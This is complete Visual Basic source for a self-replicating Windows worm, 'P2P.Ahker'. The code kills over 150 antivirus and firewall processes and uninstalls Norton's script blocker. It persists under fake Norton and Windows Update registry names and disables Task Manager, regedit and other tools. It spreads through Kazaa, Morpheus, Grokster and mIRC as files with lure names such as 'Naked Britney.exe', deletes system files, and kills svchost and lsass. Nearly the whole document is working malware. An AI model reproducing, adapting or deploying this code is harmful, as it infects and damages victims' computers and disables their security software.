   ' P2P Worm
   ' P2P.Ahker
   ' Version: A
   ' Exploits: Symantec Norton Antivirus Script Blocker Denial Of Service Vulnerability
   ' Spreads: mIRC, Kazaa, Kazaa Lite, KMD , BearShare, LimeWire, Imesh, Grokster and Morpheus
   ' Coded By Agent Hacker

   Dim y As String
   Dim n As String
   Dim m As String
   Dim i As String
   Dim q As String
   Dim z As String
   Dim f As String
   Dim e As String
   Dim x, wmi, fso
   Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
   Private Sub Form_Load()
   App.TaskVisible = False
   On Error Resume Next
   Set x = CreateObject("Wscript.shell")
   x.run "TASKKILL /F /IM msblast.exe /IM SAVScan.exe /IM NAVAPSvc.exe /IM _Avpcc.exe /IM _avpm.exe /IM _findviru.exe /IM Ackwin32.exe /IM Alogserv.exe /IM Amon.exe /IM Anti-trojan.exe /IM Apvxdwin.exe /IM Atguard.exe /IM Ave32.exe /IM Avkserv.exe /IM Avnt.exe /IM Avpcc.exe /IM Avpm.exe /IM Avwin95.exe /IM BlackIce.exe /IM Claw95cf.exe /IM Cmgrdian.exe /IM Ecengine.exe /IM Esafe.exe /IM Findviru.exe /IM Fprot.exe /IM F-prot95.exe /IM Fp-win.exe /IM Guarddog.exe /IM Iamapp.exe /IM Iomon98.exe /IM Lookout.exe /IM Navapsvc.exe /IM Navapw32.exe /IM Navt.exe /IM Navw32.exe /IM Navwt.exe /IM Nod32.exe /IM Navwnt.exe /IM Nsplugin.exe /IM Ogrc.exe /IM Outpost.exe /IM Rav7.exe /IM Rulaunch.exe /IM Scan32.exe /IM Smss.exe /IM Spider.exe /IM Vet95.exe /IM Vettray.exe /IM Vsmain.exe /IM Zonalarm.exe /IM dfw.exe /IM fsav32.exe /IM fsbwsys.exe /IM fsgk32.exe /IM fsm32.exe /IM fssm32.exe /IM fvprotect.exe /IM mcagent.exe /IM navdx.exe ", vbHide
   x.run "TASKKILL /F /IM navstub.exe /IM nc2000.exe /IM ndd32.exe /IM netarmor.exe /IM netinfo.exe /IM netmon.exe /IM nmain.exe /IM nprotect.exe /IM ntvdm.exe /IM ostronet.exe /IM pccguide.exe /IM pcciomon.exe /IM regedit.exe /IM regedit32.exe /IM taskmgr.exe /IM tnbutil.exe /IM vbcons.exe /IM vbsntw.exe /IM vbust.exe /IM vsmain.exe /IM vsmon.exe /IM vsstat.exe /IM winlogon.exe /IM ATUPDATER.exe /IM AVWUPD32.exe /IM AVPUPD.exe /IM LUALL.exe /IM DRWEBUPW.exe /IM ICSSUPPNT.exe /IM ICSUPP95.exe /IM UPDATE.exe /IM NUPGRADE.exe /IM ATUPDATER /IM AUPDATE.exe /IM AUTODOWN.exe /IM AUTOTRACE.exe /IM AUTOUPDATE.exe /IM AVXQUAR.exe /IM CFIAUDIT.exe /IM MCUPDATE.exe /IM NUPGRADE.exe /IM AVLTMAIN.exe /IM ccApp.exe /IM AGENTSVR.exe /IM ANTIVIRUS.exe /IM ANTS.EXE /IM APIMONITOR.EXE /IM APLICA32.EXE /IM ATCON.EXE /IM ATRO55EN.EXE /IM ATWATCH.EXE /IM AVCONSOL.EXE /IM AVGSERV9.EXE /IM AVSYNMGR.EXE /IM AVprotect9x.exe /IM Au.exe /IM BD_PROFESSIONAL.EXE /IM BIDEF.EXE /IM BIDSERVER.EXE /IM BIPCP.EXE /IM BIPCPEVALSETUP.EXE", vbHide
   x.run "TASKKILL /F /IM BISP.EXE /IM BLACKD.EXE /IM BOOTWARN.EXE /IM BORG2.EXE /IM BS120.EXE /IM CDP.EXE /IM CFGWIZ.EXE /IM CFIADMIN.EXE /IM CFINET.EXE /IM CFINET32.EXE /IM CLEAN.EXE /IM CLEANER.EXE /IM CLEANER3.EXE /IM CLEANPC.EXE /IM CMGRDIAN.EXE /IM CMON016.EXE /IM CPD.EXE /IM CPF9X206.EXE /IM CPFNT206.EXE /IM CV.EXE /IM CWNB181.EXE /IM CWNTDWMO.EXE /IM D3dupdate.exe /IM DEFWATCH.EXE /IM DEPUTY.EXE /IM DPF.EXE /IM DPFSETUP.EXE /IM DRWATSON.EXE /IM DRWEBUPW.EXE /IM ENT.EXE /IM ESCANH95.EXE /IM ESCANHNT.EXE /IM ESCANV95.EXE /IM EXANTIVIRUS-CNET.EXE /IM FAST.EXE/IM FIREWALL.EXE/IM FLOWPROTECTOR.EXE /IM FP-WIN_TRIAL.EXE /IM FRW.EXE /IM FSAV.EXE /IM FSAV530STBYB.EXE /IM FSAV530WTBYB.EXE /IM FSAV95.EXE /IM GBMENU.EXE /IM GBPOLL.EXE /IM GUARD.EXE /IM HACKTRACERSETUP.EXE /IM HTLOG.EXE /IM HWPE.EXE /IM IAMAPP.EXE /IM IAMSERV.EXE /IM ICLOAD95.EXE /IM ICLOADNT.EXE /IM ICMON.EXE/IM ICSSUPPNT.EXE /IM ICSUPP95.EXE /IM ICSUPPNT.EXE /IM IFW2000.EXE /IM IPARMOR.EXE /IM IRIS.EXE /IM JAMMER.EXE /IM KAVLITE40ENG.EXE", vbHide
   x.run "TASKKILL /F /IM KAVPERS40ENG.EXE /IM KERIO-PF-213-EN-WIN.EXE /IM KERIO-WRL-421-EN-WIN.EXE /IM KERIO-WRP-421-EN-WIN.EXE /IM KILLPROCESSSETUP161.EXE /IM LDPRO.EXE /IM LOCALNET.EXE /IM LOCKDOWN.EXE /IM LOCKDOWN2000.EXE /IM LSETUP.EXE /IM LUCOMSERVER.EXE /IM LUINIT.EXE /IM MCAGENT.EXE /IM MCUPDATE.EXE /IM MFW2EN.EXE /IM MFWENG3.02D30.EXE /IM MGUI.EXE /IM MINILOG.EXE /IM MOOLIVE.EXE /IM MRFLUX.EXE/IM MSCONFIG.EXE /IM MSINFO32.EXE /IM MSSMMC32.EXE /IM MU0311AD.EXE /IM NAV80TRY.EXE /IM NAVDX.EXE /IM NAVSTUB.EXE /IM NC2000.EXE /IM NCINST4.EXE /IM NDD32.EXE /IM NEOMONITOR.EXE /IM NETARMOR.EXE /IM NETINFO.EXE /IM NETMON.EXE /IM NETSCANPRO.EXE /IM NETSPYHUNTER-1.2.EXE /IM NETSTAT.EXE /IM NISSERV.EXE /IM NISUM.EXE /IM NMAIN.EXE /IM NORTON_INTERNET_SECU_3.0_407.EXE /IM NPF40_TW_98_NT_ME_2K.EXE ", vbHide
   x.run "TASKKILL /F /IM NPFMESSENGER.EXE /IM NSCHED32.EXE /IM NTVDM.EXE /IM NVARCH16.EXE /IM NWINST4.EXE /IM NWTOOL16.EXE /IM OSTRONET.EXE /IM OUTPOST.EXE /IM OUTPOSTINSTALL.EXE /IM OUTPOSTPROINSTALL.EXE /IM PADMIN.EXE /IM PANIXK.EXE /IM PAVPROXY.EXE /IM PCC2002S902.EXE /IM PCC2K_76_1436.EXE /IM PCCIOMON.EXE /IM PCDSETUP.EXE /IM PCFWALLICON.EXE /IM PCIP10117_0.EXE /IM PDSETUP.EXE /IM PERISCOPE.EXE /IM PERSFW.EXE /IM PF2.EXE /IM PFWADMIN.EXE /IM PINGSCAN.EXE /IM PLATIN.EXE /IM POPROXY.EXE /IM POPSCAN.EXE /IM PORTDETECTIVE.EXE /IM PPINUPDT.EXE /IM PPTBC.EXE /IM PPVSTOP.EXE /IM PROCEXPLORERV1.0.EXE /IM PROPORT.EXE /IM PROTECTX.EXE /IM PSPF.EXE /IM PURGE.EXE /IM PVIEW95.EXE /IM QCONSOLE.EXE /IM QSERVER.EXE /IM RAV8WIN32ENG.EXE /IM RESCUE.EXE /IM RESCUE32.EXE /IM RRGUARD.EXE /IM RSHELL.EXE /IM RTVSCN95.EXE /IM RULAUNCH.EXE /IM SAFEWEB.EXE /IM SBSERV.EXE /IM SD.EXE /IM SETUPVAMEEVAL.EXE /IM SETUP_FLOWPROTECTOR_US.EXE /IM SFC.EXE /IM SGSSFW32.EXE /IM SHELLSPYINSTALL.EXE /IM SHN.EXE /IM SMC.EXE /IM SOFI.EXE", vbHide
   x.run "TASKKILL /F /IM SPF.EXE /IM SPHINX.EXE /IM SPYXX.EXE /IM SS3EDIT.EXE /IM ST2.EXE /IM SUPFTRL.EXE /IM SUPPORTER5.EXE /IM SYMPROXYSVC.EXE /IM SYSEDIT.EXE /IM TASKMON.EXE /IM TAUMON.EXE /IM TAUSCAN.EXE /IM TC.EXE /IM TCA.EXE /IM TCM.EXE /IM TDS-3.EXE /IM TDS2-98.EXE /IM TDS2-NT.EXE /IM TFAK5.EXE /IM TGBOB.EXE /IM TITANIN.EXE /IM TITANINXP.EXE /IM TRACERT.EXE /IM TRJSCAN.EXE /IM TRJSETUP.EXE /IM TROJANTRAP3.EXE /IM UNDOBOOT.EXE /IM UPDATE.EXE /IM VBCMSERV.EXE /IM VBCONS.EXE /IM VBUST.EXE /IM VBWIN9X.EXE /IM VBWINNTW.EXE /IM VCSETUP.EXE /IM VFSETUP.EXE /IM VIRUSMDPERSONALFIREWALL.EXE /IM VNLAN300.EXEVNPC3000.EXE /IM VPC42.EXE/IM VPFW30S.EXE /IM VPTRAY.EXE /IM VSCENU6.02D30.EXE /IM VSECOMR.EXE /IM VSHWIN32.EXE /IM VSISETUP.EXE /IM VSMAIN.EXE /IM VSMON.EXE /IM VSSTAT.EXE /IM VSWIN9XE.EXE /IM VSWINNTSE.EXE /IM VSWINPERSE.EXE /IM W32DSM89.EXE /IM W9X.EXE /IM WATCHDOG.EXE /IM WEBSCANX.EXE /IM WGFE95.EXE /IM WHOSWATCHINGME.EXE /IM WINRECON.EXE /IM WNT.EXE /IM WRADMIN.EXE /IM WRCTRL.EXE /IM WSBGATE.EXE", vbHide
   x.run "TASKKILL /F /IM WYVERNWORKSFIREWALL.EXE /IM XPF202EN.EXE /IM ZAPRO.EXE /IM ZAPSETUP3001.EXE /IM ZATUTOR.EXE /IM ZAUINST.EXE /IM ZONALM2601.EXE /IM ZONEALARM.EXE /IM avserve2.exe"
   'Ends ALL AV and FireWall Processes More than 150 Processes!!
   'Expoit
   Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
   For Each c In wmi.ExecQuery("Select * from Win32_Product")
   If InStr(c.Name, "Script") And InStr(c.Name, "Block") Then
   c.UnInstall
   End If
   Next
   Set fso = CreateObject("scripting.filesystemobject")
   fso.createtextfile("c:\Norton AntiVirus.txt").write "Script Blocking: Disabled"
   ' End of Exploit
   x.regdelete "HKLM\software\Microsoft\windows\currentversion\run\windows auto update" 'Deletes Blaster's Value from the registry
   If Dir(Environ("WinDir") & "\CSRSS.exe") = "" Then
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("WinDir") & "\CSRSS.exe"
   End If
   ' Copies itself to Startup folder!!
   If Dir(Environ("UserProfile") & "\Start Menu\Programs\Startup\") = "" Then
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("UserProfile") & "\Start Menu\Programs\Startup\CSRSS.exe"
   End If
   x.regwrite "HKLM\Software\Microsoft\windows\CurrentVersion\Run\Norton Auto-Protect", "CSRSS.exe"
   x.regwrite "HKLM\software\microsoft\windows\currentversion\runservices-\P2P Service", "CSRSS.exe"
   x.regwrite "HKLM\software\microsoft\windows\currentversion\windowsupdate\auto update\", "CSRSS.exe"
   ' Tricks
   ' disables TaskManager(Ctrl+Alt+Del)
   x.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
   ' Disables Registry Editor!!
   x.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
   ' NO RUN!!
   x.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
   ' Sets a name to the computer...
   x.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\activeComputerName\computername", "Agent Hacker"
   x.regwrite "HKLM\software\microsoft\windows\currentversion\app paths\LUALL.exe\", "CSRSS.exe"
   x.regwrite "HKLM\software\Microsoft\internet explorer\registration\ProductId", "Agent Hacker"
   x.regwrite "HKLM\software\Microsoft\windows\currentversion\ProductId", "Agent Hacker"
   x.regwrite "HKLM\software\Microsoft\windowsnt\currentversion\ProductId", "Agent Hacker"
   x.regwrite "HKLM\system\wpa\Key-MGM9K8XQ2GHRBGTP2TR93\ProductID", "Agent Hacker"
   x.regwrite "HKCR\txtfile\shell\open\command\", "CSRSS.exe %1"
   x.regwrite "HKCR\RDP.File\Friendlytypename", "@CSRSS.exe, -4004"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\", "P2P.Ahker"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\Version", "A"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\Coded In", "Visual Basic 6.0"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\Coded By", "Agent Hacker"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\Spread", "VIA P2P"
   x.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Agent Hacker\Exploit", "Symantec Norton Antivirus Script Blocker Denial Of Service Vulnerability"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun", "1"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1", "regedit.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2", "notepad.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3", "wordpad.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4", "write.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5", "wuauclt.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\6", "wupdmgr.exe"
   x.regwrite "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\7", "C:\Program Files\MSN Messenger\msnmsgr.exe"
   'Spread VIA P2P
   e = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\Grokster\My Grokster" Then GoTo skip0000

   MkDir ("C:\Program Files\Grokster\My Grokster")

   skip0000:

   FileCopy e, "C:\Program Files\Grokster\My Grokster\Sex.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Porn.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Paris Hilton.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\PORNO.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\XXX.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Naked WWE Divas.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Naked Britney.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Naked Celebrity.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\Celeb uncensord.exe"
   FileCopy e, "C:\Program Files\Grokster\My Grokster\SUCK.exe"
   '
   f = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\Morpheus\My Shared Folder" Then GoTo skip00000

   MkDir ("C:\Program Files\Morpheus\My Shared Folder")

   skip00000:

   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Sex.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Porn.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Paris Hilton.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\PORNO.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\XXX.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Naked WWE Divas.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Naked Britney.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Naked Celebrity.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\Celeb uncensord.exe"
   FileCopy f, "C:\Program Files\Morpheus\My Shared Folder\SUCK.exe"
   '
   i = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\kazaA lite\My Shared Folder" Then GoTo skip

   MkDir ("C:\Program Files\kazaA lite\My Shared Folder")

   skip:

   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Sex.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Porn.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Paris Hilton.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\PORNO.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\XXX.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Naked WWE Divas.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Naked Britney.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Naked Celebrity.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\Celeb uncensord.exe"
   FileCopy i, "C:\Program Files\kazaA lite\My Shared Folder\SUCK.exe"
   '
   q = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\KMD\My Shared Folder" Then GoTo skip0

   MkDir ("C:\Program Files\KMD\My Shared Folder")

   skip0:

   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Sex.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Porn.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Paris Hilton.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\PORNO.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\XXX.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Naked WWE Divas.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Naked Britney.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Naked Celebrity.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\Celeb uncensord.exe"
   FileCopy q, "C:\Program Files\KMD\My Shared Folder\SUCK.exe"
   '
   y = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\My Downloads" Then GoTo skip007

   MkDir ("C:\My Downloads")

   skip007:

   FileCopy y, "C:\My Downloads\Sex.exe"
   FileCopy y, "C:\My Downloads\Porn.exe"
   FileCopy y, "C:\My Downloads\Paris Hilton.exe"
   FileCopy y, "C:\My Downloads\PORNO.exe"
   FileCopy y, "C:\My Downloads\XXX.exe"
   FileCopy y, "C:\My Downloads\Naked WWE Divas.exe"
   FileCopy y, "C:\My Downloads\Naked Britney.exe"
   FileCopy y, "C:\My Downloads\Naked Celebrity.exe"
   FileCopy y, "C:\My Downloads\Celeb uncensord.exe"
   FileCopy y, "C:\My Downloads\SUCK.exe"
   '
   If Dir(Environ("userprofile") & "\shared\") = "" Then
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Sex.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Porn.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Paris Hilton.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\PORNO.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\XXX.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Naked WWE Divas.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Naked Britney.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Naked Celebrity.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\Celeb uncensored.exe"
   FileCopy App.Path & "\" & App.EXEName & ".exe", Environ("userprofile") & "\Shared\SUCK.exe"
   End If
   '
   newfolderpath = "c:\Program Files\NAV"
   Set filesys = CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
   Set newfolder = filesys.CreateFolder(newfolderpath)
   End If
   '***********************************************************
   z = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\NAV" Then GoTo skip00

   MkDir ("C:\Program Files\NAV")

   skip00:

   FileCopy z, "C:\Program Files\NAV\Sex.exe"
   FileCopy z, "C:\Program Files\NAV\Porn.exe"
   FileCopy z, "C:\Program Files\NAV\Paris Hilton.exe"
   FileCopy z, "C:\Program Files\NAV\PORNO.exe"
   FileCopy z, "C:\Program Files\NAV\XXX.exe"
   FileCopy z, "C:\Program Files\NAV\Naked WWE Divas.exe"
   FileCopy z, "C:\Program Files\NAV\Naked Britney.exe"
   FileCopy z, "C:\Program Files\NAV\Naked Celebrity.exe"
   FileCopy z, "C:\Program Files\NAV\Celeb uncensord.exe"
   FileCopy z, "C:\Program Files\NAV\SUCK.exe"
   '*********************************************************
   x.regwrite "HKEY_CURRENT_USER\Software\Imesh\Client\LocalContent\Dir0", "012345:%Program Files%\NAV"

   x.regwrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\Dir0", "012345:%Program Files%\NAV"

   x.regwrite "HKEY_CURRENT_USER\Software\Kazaa\Transfer\D1Dir0", "%Program Files%\NAV"

   x.regwrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DisableSharing", "0"
   ' Spread mIRC
   m = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\Program Files\mIRC" Then GoTo skip000

   MkDir ("C:\Program Files\mIRC")

   skip000:

   FileCopy m, "C:\Program Files\mIRC\Nude Britney.exe"

   '
   Open "C:\Program files\Mirc\Mirc.ini" For Output As #1
   Print #1, "n3=c:\Program Files\mIRC\Nude Britney.exe"
   Close #1
   Open "C:\Program files\Mirc\Script.ini" For Output As #1
   Print #1, "n3=c:\Program files\mIRC\Nude Britney.exe"
   Close #1
   ''''''''''''''''''''''''''''''''''''''''''
   n = App.Path + "\" + App.EXEName + ".exe"

   If App.Path = "C:\mIRC" Then GoTo skip00010

   MkDir ("C:\mIRC")

   skip00010:

   FileCopy n, "C:\mIRC\Nude Britney.exe"
   '''''''''''''''''''''''''''''''''''''''
   Open "C:\Mirc\Mirc.ini" For Output As #1
   Print #1, "n3=c:\mIRC\Nude Britney.exe"
   Close #1
   Open "C:\mIRC\Script.ini" For Output As #1
   Print #1, "n3=c:\mIRC\Nude Britney.exe"
   Close #1
   '''''''''''''''''''''''''''''''''''''''
   Kill "C:\Windows\System.dat"
   Kill "C:\Autoexec.bat"
   Kill "C:\Config.sys"
   If Day(Now) = 20 And Month(Now) = 1 Then
   MsgBox "P2P.Ahker", vbCritical, "Coded By Agent Hacker"
   End If
   Sleep 900000
   'DESTROY THE RPC SERVER!!
   x.run "TASKKILL /T /F /IM SVCHOST.exe", vbHide
   x.run "TASKKILL /F /IM LSASS.exe", vbHide
   End Sub
